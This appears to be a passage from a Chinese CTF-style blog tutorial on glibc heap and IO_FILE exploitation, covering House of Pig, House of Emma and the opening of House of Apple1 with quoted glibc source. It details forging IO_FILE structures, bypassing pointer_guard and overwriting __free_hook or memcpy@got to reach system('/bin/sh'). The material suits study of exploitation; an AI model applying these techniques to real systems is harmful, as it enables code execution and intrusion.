<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">_Noreturn</span> <span class="type">static</span> <span class="type">void</span></span><br><span class="line">__malloc_assert (<span class="type">const</span> <span class="type">char</span> *assertion, <span class="type">const</span> <span class="type">char</span> *file, <span class="type">unsigned</span> <span class="type">int</span> line,</span><br><span class="line">		 <span class="type">const</span> <span class="type">char</span> *function)</span><br><span class="line">&#123;</span><br><span class="line">  __libc_message (do_abort, <span class="string">&quot;\</span></span><br><span class="line"><span class="string">Fatal glibc error: malloc assertion failure in %s: %s\n&quot;</span>,</span><br><span class="line">		  function, assertion);</span><br><span class="line">  __builtin_unreachable ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-IO_FILE-exploit/images/3279bc7caeba02a85f8abfb52a8435df.png"
                      alt="在这里插入图片描述"
                ></p>
<h2 id="House-of-Pig"><a href="#House-of-Pig" class="headerlink" title="House of Pig"></a>House of Pig</h2><p>xctf final <a class="link"   href="https://gitcode.net/qq_45323960/attachment/-/tree/master/house_of_poc/house%20of%20pig" >同名题目 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，题目条件太多这里只讲思路。<br>tcache stash unlink 可以实现任意地址申请内存，但是这种方法的前提是同时有 calloc 和 malloc 两种申请内存的方式。对于只能 calloc 申请内存的题目，还需要结合 large bin attack 手法劫持 <code>_IO_list_all</code> 然后伪造 IO_FILE 结构体从而劫持 <code>vtable</code> 到 <code>_IO_str_jumps</code> 上，进而在程序退出时利用 <code>_IO_str_overflow</code> 的 <code>malloc</code> 完成 tcache stash unlink 攻击，利用 <code>memcpy</code> 在 <code>__free_hook</code> 写入 <code>system</code> 函数地址，利用 <code>free</code> 获取 shell 。</p>
<p> 首先利用 1 次 UAF 修改 small bin 中 chunk 的 bk 指针使其指向 <code>__free_hook - 0x20</code>，然后利用 large bin attack 修改 <code>__free_hook</code> 所在 fake chunk 的 bk 指针指向 large bin 中的 chunk ，从而 tcache stash unlink 的触发条件。<br> 除此之外，还要再次利用 large bin attack 修改 <code>_IO_list_all</code> 指向 large bin 中的 chunk 。为后面劫持 IO_FILE 做准备。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-IO_FILE-exploit/images/5d679c89682963d46efd9ce65e9ade29.png"
                      alt="在这里插入图片描述"
                ><br> 通过 calloc 触发 stash 将 <code>__free_hook</code> 所在 fake chunk 链入 tcache 。之后再将 <code>_IO_list_all</code> 指向的 chunk 申请出来，并在里面伪造 IO_FILE 结构体。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-IO_FILE-exploit/images/53378ee630a5729d6db2e82e939207c2.png"
                      alt="在这里插入图片描述"
                ><br>函数在退出时会调用 <code>_IO_flush_all_lockp</code> 。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_flush_all_lockp (<span class="type">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">for</span> (fp = (FILE *) _IO_list_all; fp != <span class="literal">NULL</span>; fp = fp-&gt;_chain)</span><br><span class="line">    &#123;</span><br><span class="line">      ...</span><br><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">	   || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">	       &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">				    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">	   )</span><br><span class="line">	  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">	result = EOF;</span><br><span class="line">	...</span><br><span class="line">    &#125;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>为了让 <code>_IO_flush_all_lockp</code> 能够调用执行到 <code>_IO_OVERFLOW</code> 从而调用 <code>_IO_str_overflow</code> ，需要满足如下条件：</p>
<ul>
<li><code>fp-&gt;_mode &lt;= 0</code></li>
<li><code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code></li>
</ul>
<p>由于 vtable 被劫持，程序之后会执行到 <code>_IO_str_overflow</code> 。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_str_overflow (FILE *fp, <span class="type">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> flush_only = c == EOF;</span><br><span class="line">  <span class="type">size_t</span> pos;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)</span><br><span class="line">      <span class="keyword">return</span> flush_only ? <span class="number">0</span> : EOF;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span><br><span class="line">      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class="line">    &#125;</span><br><span class="line">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (pos &gt;= (<span class="type">size_t</span>) (_IO_blen (fp) + flush_only))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="comment">/* not allowed to enlarge */</span></span><br><span class="line">	<span class="keyword">return</span> EOF;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="type">char</span> *new_buf;</span><br><span class="line">	  <span class="type">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">	  <span class="type">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">	  <span class="type">size_t</span> new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line">	  <span class="keyword">if</span> (new_size &lt; old_blen)</span><br><span class="line">	    <span class="keyword">return</span> EOF;</span><br><span class="line">	  new_buf = <span class="built_in">malloc</span> (new_size);</span><br><span class="line">	  <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="comment">/*	  __ferror(fp) = 1; */</span></span><br><span class="line">	      <span class="keyword">return</span> EOF;</span><br><span class="line">	    &#125;</span><br><span class="line">	  <span class="keyword">if</span> (old_buf)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen);</span><br><span class="line">	      <span class="built_in">free</span> (old_buf);</span><br><span class="line">	      <span class="comment">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span></span><br><span class="line">	      fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">	    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>首先注意 <code>_flag</code> 的值（通常设为 0），避免提前从函数返回。之后程序执行到下面这个关键位置。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line"><span class="type">size_t</span> new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line"><span class="type">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">...</span><br><span class="line">new_buf = <span class="built_in">malloc</span> (new_size);</span><br><span class="line">...</span><br><span class="line"><span class="built_in">memcpy</span> (new_buf, old_buf, old_blen);</span><br><span class="line"><span class="built_in">free</span> (old_buf);</span><br></pre></td></tr></table></figure></div>
<p>其中 <code>_IO_blen</code> 定义如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_blen(fp) ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base)</span></span><br></pre></td></tr></table></figure></div>
<p>此时程序执行 <code>malloc</code> 函数完成 tcache stash unlink 攻击将 <code>__free_hook</code> 所在的 fake chunk 申请出来，随后执行 <code>memcpy</code> 函数，将 <code>fp-&gt;_IO_buf_base</code> 和 <code>fp-&gt;_IO_buf_end</code> 之间的数据复制到 <code>__free_hook</code> 所在 fake chunk 中，将 <code>__free_hook</code> 覆盖为 <code>system</code> 函数地址。最后将 <code>fp-&gt;_IO_buf_base</code> 指向的地址即 <code>/bin/sh</code> 字符串地址作为参数传入 <code>free</code> 函数得到 shell 。</p>
<p>glibc-2.34 起取消了 ptmalloc 中的各种 hook，但是仍然可以利用 house of pig 实现任意地址写任意值，借助其他手段完成 get shell 。</p>
<p>例如<a class="link"   href="https://gitcode.net/qq_45323960/attachment/-/tree/master/glibc_pwn/eznoted2b1405e" >这道题目 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。观察发现，<code>_IO_str_overflow</code> 中的 <code>memcpy</code> 实际上是通过 got 表调用的，因此我们可以构造多个 _IO_FILE 链将 <code>memcpy@got</code> 改写成 <code>system</code> 函数地址然后调用 <code>memcpy</code> 实现 get shell 。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-IO_FILE-exploit/images/957c20f5f1a3136e9e9d5ec880a4c8fb.png"
                      alt="在这里插入图片描述"
                ><br>一种构造方案如上图所示，四个 _IO_FILE 作用如下：</p>
<ul>
<li>第一个 _IO_FILE 调用 <code>_IO_str_overflow</code> 中的 <code>free</code> 函数将 <code>tcache_perthread_struct</code> 释放实现一次 House of IO 。</li>
<li>第二次 _IO_FILE 首先调用 <code>_IO_str_overflow</code> 中的 <code>malloc</code> 将 <code>tcache_perthread_struct</code> 申请出来，然后调用 <code>memcpy</code> 控制 <code>tcache_perthread_struct</code> 中的数据，使得其中的 <code>entires</code> 指向 <code>&amp;memcpy@got - 0x10</code> 。</li>
<li>第三次 _IO_FILE 首先调用 <code>_IO_str_overflow</code> 中的 <code>malloc</code> 将 <code>&amp;memcpy@got - 0x10</code> 申请出来，然后调用 <code>memcpy</code> 将 <code>memcpy@got</code> 覆盖为 <code>system</code> 函数地址，同时将 <code>&amp;memcpy@got - 0x10</code> 处写入 <code>/bin/sh</code> 字符串。</li>
<li>第四次 _IO_FILE 调用 <code>malloc</code> 再次将 <code>&amp;memcpy@got - 0x10</code> 申请出来然后调用 <code>memcpy</code> ，即 <code>system</code> 函数并传入 <code>&amp;memcpy@got - 0x10</code> 参数执行 <code>system(&quot;/bin/sh&quot;)</code> 。</li>
</ul>
<h2 id="House-of-Emma"><a href="#House-of-Emma" class="headerlink" title="House of Emma"></a>House of Emma</h2><p>如果 <code>vtable</code> 指向的 <code>_IO_file_jumps</code> 不可写，那么 House of Kiwi 这种攻击手法就会失效。这时候就需要考虑劫持 vtable 。但在新版 glibc ，之前的劫持 vtable 的方法已经失效。</p>
<ul>
<li>由于自 libc-2.24 起对 vtable 指向的地址范围有检查，因此不能随便将 vtable 劫持到某块伪造了 <code>_IO_jump_t</code> 的内存上。</li>
<li>自 glibc-2.28 起，<code>_IO_str_jumps</code> 上的 <code>_IO_str_finish</code> 不再调用 <code>_IO_strfile</code>（IO_FILE 结构体） 上的函数指针。</li>
</ul>
<p>因此需要寻找其他的危险函数来劫持程序流。</p>
<p>vtable 的合法范围内，还有另一个 <code>_IO_jump_t</code> 类型的函数表叫做 <code>_IO_cookie_jumps</code> ，其中有如下危险函数可供我们利用：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">ssize_t</span></span><br><span class="line">_IO_cookie_read (FILE *fp, <span class="type">void</span> *buf, <span class="type">ssize_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_read_function_t</span> *read_cb = cfile-&gt;__io_functions.read;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (read_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (read_cb == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read_cb (cfile-&gt;__cookie, buf, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span></span><br><span class="line">_IO_cookie_write (FILE *fp, <span class="type">const</span> <span class="type">void</span> *buf, <span class="type">ssize_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_write_function_t</span> *write_cb = cfile-&gt;__io_functions.write;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (write_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (write_cb == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">ssize_t</span> n = write_cb (cfile-&gt;__cookie, buf, size);</span><br><span class="line">  <span class="keyword">if</span> (n &lt; size)</span><br><span class="line">    fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">off64_t</span></span><br><span class="line">_IO_cookie_seek (FILE *fp, <span class="type">off64_t</span> offset, <span class="type">int</span> dir)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_seek_function_t</span> *seek_cb = cfile-&gt;__io_functions.seek;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (seek_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> ((seek_cb == <span class="literal">NULL</span></span><br><span class="line">       || (seek_cb (cfile-&gt;__cookie, &amp;offset, dir)</span><br><span class="line">           == <span class="number">-1</span>)</span><br><span class="line">       || offset == (<span class="type">off64_t</span>) <span class="number">-1</span>)</span><br><span class="line">      ? _IO_pos_BAD : offset);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line">_IO_cookie_close (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_close_function_t</span> *close_cb = cfile-&gt;__io_functions.close;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (close_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (close_cb == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> close_cb (cfile-&gt;__cookie);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>其中 <code>_IO_cookie_file</code> 有如下定义：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Special file type for fopencookie function.  */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> __<span class="title">fp</span>;</span></span><br><span class="line">  <span class="type">void</span> *__cookie;</span><br><span class="line">  <span class="type">cookie_io_functions_t</span> __io_functions;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_io_functions_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">cookie_read_function_t</span> *read;        <span class="comment">/* Read bytes.  */</span></span><br><span class="line">  <span class="type">cookie_write_function_t</span> *write;    <span class="comment">/* Write bytes.  */</span></span><br><span class="line">  <span class="type">cookie_seek_function_t</span> *seek;        <span class="comment">/* Seek/tell file position.  */</span></span><br><span class="line">  <span class="type">cookie_close_function_t</span> *close;    <span class="comment">/* Close file.  */</span></span><br><span class="line">&#125; <span class="type">cookie_io_functions_t</span>;</span><br></pre></td></tr></table></figure></div>

<p>因此攻击手法与前面的 <code>_IO_str_jumps</code> 相似，不过需要绕过指针保护 <code>PTR_DEMANGLE</code> 。</p>
<p>通过分析汇编可知，这段宏定义的操作是将函数指针循环右移 11 位然后与 <code>fs:[0x30]</code> 异或得到真正的函数地址。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-IO_FILE-exploit/images/36b26ac6e793533e1a7c4189e34d6baa.png"
                      alt="在这里插入图片描述"
                ><br>我们知道， <code>fs:[0x28]</code> 是 tls 上存储的 canary，根据 <code>tcbhead_t</code> 结构体的定义，<code>fs[0x30]</code> 是 <code>pointer_guard</code> ，用于对指针进行加密。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//sysdeps/x86_64/nptl/tls.h</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">  <span class="type">void</span> *tcb;    <span class="comment">/* 指向TCB */</span></span><br><span class="line">  <span class="type">dtv_t</span> *dtv;       <span class="comment">/* 指向dtv数组 */</span></span><br><span class="line">  <span class="type">void</span> *self;   <span class="comment">/* 指向自身  */</span></span><br><span class="line">  <span class="type">int</span> multiple_threads;</span><br><span class="line">  <span class="type">int</span> gscope_flag;</span><br><span class="line">  <span class="type">uintptr_t</span> sysinfo;</span><br><span class="line">  <span class="type">uintptr_t</span> stack_guard;    <span class="comment">/* canary值 */</span></span><br><span class="line">  <span class="type">uintptr_t</span> pointer_guard;  <span class="comment">/* 用于保护指针 */</span></span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">&#125; <span class="type">tcbhead_t</span>;</span><br></pre></td></tr></table></figure></div>
<p>因此我们可以先泄露堆地址和 libc 基地址，然后利用 large bin attack 在 tls 对应 <code>pointer_guard</code> 上写一个 chunk 地址，从而绕过指针保护。</p>
<p>在实际调试时可以利用 canary 等方法查找  <code>pointer_guard</code> 地址，然后在攻击时根据 libc 基地址定位 <code>pointer_guard</code> 。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-IO_FILE-exploit/images/af639b064c55f2d2fc12070d4cf5e1a2.png"
                      alt="在这里插入图片描述"
                ><br>与 house of kiwi 一样，house of emma 也是通过 <code>__malloc_assert</code> 触发漏洞，但是由于 <code>pointer_guard</code> 已被修改，原来受保护的函数指针都已经无法调用，因此要选择最早调用的 <code>vtable</code> 中的函数进行触发，因此这里选择下面这个调用链：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">__malloc_assert (<span class="type">const</span> <span class="type">char</span> *assertion, <span class="type">const</span> <span class="type">char</span> *file, <span class="type">unsigned</span> <span class="type">int</span> line,</span><br><span class="line">		 <span class="type">const</span> <span class="type">char</span> *function)</span><br><span class="line">&#123;</span><br><span class="line">  (<span class="type">void</span>) __fxprintf (<span class="literal">NULL</span>, <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,</span><br><span class="line">		     __progname, __progname[<span class="number">0</span>] ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">		     file, line,</span><br><span class="line">		     function ? function : <span class="string">&quot;&quot;</span>, function ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">		     assertion);</span><br><span class="line">  fflush (<span class="built_in">stderr</span>);</span><br><span class="line">  <span class="built_in">abort</span> ();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line">__fxprintf (FILE *fp, <span class="type">const</span> <span class="type">char</span> *fmt, ...)</span><br><span class="line">&#123;</span><br><span class="line">  va_list ap;</span><br><span class="line">  va_start (ap, fmt);</span><br><span class="line">  <span class="type">int</span> res = __vfxprintf (fp, fmt, ap, <span class="number">0</span>);</span><br><span class="line">  va_end (ap);</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line">__vfxprintf (FILE *fp, <span class="type">const</span> <span class="type">char</span> *fmt, va_list ap,</span><br><span class="line">	     <span class="type">unsigned</span> <span class="type">int</span> mode_flags)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp == <span class="literal">NULL</span>)</span><br><span class="line">    fp = <span class="built_in">stderr</span>;</span><br><span class="line">  _IO_flockfile (fp);</span><br><span class="line">  <span class="type">int</span> res = locked_vfxprintf (fp, fmt, ap, mode_flags);</span><br><span class="line">  _IO_funlockfile (fp);</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">locked_vfxprintf</span> <span class="params">(FILE *fp, <span class="type">const</span> <span class="type">char</span> *fmt, va_list ap,</span></span><br><span class="line"><span class="params">		  <span class="type">unsigned</span> <span class="type">int</span> mode_flags)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (_IO_fwide (fp, <span class="number">0</span>) &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> __vfprintf_internal (fp, fmt, ap, mode_flags);</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> vfprintf	__vfprintf_internal</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">vfprintf</span> <span class="params">(FILE *s, <span class="type">const</span> CHAR_T *format, va_list ap, <span class="type">unsigned</span> <span class="type">int</span> mode_flags)</span></span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  outstring ((<span class="type">const</span> UCHAR_T *) format,</span><br><span class="line">	     lead_str_end - (<span class="type">const</span> UCHAR_T *) format);</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> outstring(String, Len)                          \</span></span><br><span class="line"><span class="meta">    do &#123;                                                \</span></span><br><span class="line"><span class="meta">        const void *string_ = (String);                 \</span></span><br><span class="line"><span class="meta">        done = outstring_func(s, string_, (Len), done); \</span></span><br><span class="line"><span class="meta">        <span class="keyword">if</span> (done &lt; 0)                                   \</span></span><br><span class="line"><span class="meta">            goto all_done;                              \</span></span><br><span class="line"><span class="meta">    &#125; while (0)</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> PUT(F, S, N)	_IO_sputn ((F), (S), (N))  </span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">outstring_func</span> <span class="params">(FILE *s, <span class="type">const</span> UCHAR_T *<span class="built_in">string</span>, <span class="type">size_t</span> length, <span class="type">int</span> done)</span></span><br><span class="line">&#123;</span><br><span class="line">  assert ((<span class="type">size_t</span>) done &lt;= (<span class="type">size_t</span>) INT_MAX);</span><br><span class="line">  <span class="keyword">if</span> ((<span class="type">size_t</span>) PUT (s, <span class="built_in">string</span>, length) != (<span class="type">size_t</span>) (length))</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">return</span> done_add_func (length, done);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>这里以同名题目<a class="link"   href="https://gitcode.net/qq_45323960/attachment/-/tree/master/house_of_poc/house%20of%20emma" >2021湖湘杯 house of emma <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 为例讲解利用过程：</p>
<p>在利用 UAF 泄露 libc 和堆地址后，利用 2 次 large bin attack 分别覆盖 <code>pointer_guard</code> 和 <code>stderr</code> 指针为某 chunk 地址，然后作如下图所示构造。最后通过 <code>__malloc_asserrt</code> 触发漏洞。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-IO_FILE-exploit/images/a581688d6d87d4545d97df1aa93eb4db.png"
                      alt="在这里插入图片描述"
                ></p>
<p>需要注意的是，由于伪造的 IO_FILE 的 flag 的 <code>_IO_USER_LOCK</code>（0x8000）没有置位，因此在 <code>__vfxprintf</code> 函数中会执行如下代码：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-IO_FILE-exploit/images/9197cd36b1e6a2381782a2a0dd8b4a17.png"
                      alt="在这里插入图片描述"
                ><br>因此伪造的 IO_FILE 的 <code>_lock</code> 应该指向可读写的内存。</p>
<h2 id="House-of-Apple1"><a href="#House-of-Apple1" class="headerlink" title="House of Apple1"></a>House of Apple1</h2><p>在 IO_FILE 结构体中存在指针 <code>_wide_data</code> 指向一块 <code>_IO_wide_data</code> 类型的内存，<code>_IO_wide_data</code> 类型定义如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Extra data for wide character streams.  */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_ptr;	<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_end;	<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_base;	<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_base;	<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_ptr;	<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_end;	<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_base;	<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_end;		<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_base;	<span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_backup_base;	<span class="comment">/* Pointer to first valid character of</span></span><br><span class="line"><span class="comment">				   backup area */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_end;	<span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_state;</span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_last_state;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> _<span class="title">codecvt</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="type">wchar_t</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *_<span class="title">wide_vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<p>通过 <code>_IO_wstrn_overflow</code> 函数可以在 <code>_wide_data</code> 指向的内存中写入连续 8 个 <code>snf-&gt;overflow_buf</code> 开始或结束位置的值。</p>
